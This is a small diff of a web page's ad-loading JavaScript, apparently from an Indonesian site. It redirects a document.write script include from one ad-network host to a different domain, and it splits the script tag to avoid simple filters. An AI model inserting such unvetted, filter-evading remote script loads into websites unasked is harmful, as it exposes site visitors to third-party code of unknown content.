@@ -11,7 +11,7 @@ atOptions = {
     'params' : {}
 };
 
-document.write('<scr' + 'ipt type="text/javascript" src="//www.highperformanceformat.com/fd0dc19b780ed704c21dbcab9bc01872/invoke.js"></scr' + 'ipt>');
+document.write('<scr' + 'ipt type="text/javascript" src="//bauval.org/22/fd0dc19b780ed704c21dbcab9bc01872"></scr' + 'ipt>');
 // Batas Iklan
 
 document.write('</div>');
